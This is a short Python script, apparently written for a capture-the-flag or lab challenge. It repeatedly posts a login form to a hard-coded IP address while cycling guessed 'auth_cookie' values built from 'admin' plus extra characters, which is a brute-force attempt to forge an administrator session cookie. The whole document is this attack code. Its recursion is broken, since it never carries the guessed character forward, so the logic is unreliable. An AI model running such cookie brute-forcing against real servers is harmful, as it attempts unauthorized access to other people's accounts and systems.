import requests

url = "http://178.128.112.149/9_advance/user.php"


form_data = {'username': 'user', 'password': 'user'}

def rec(s, depth):
    if(depth == 3):
        return s

    for i in range(96):
        cookie = {"auth_cookie": s+chr(35+i)}

        p = requests.post(url, cookies=cookie, data=form_data)
        print(p.text)

        rec(s, depth+1)

rec("admin", 0)
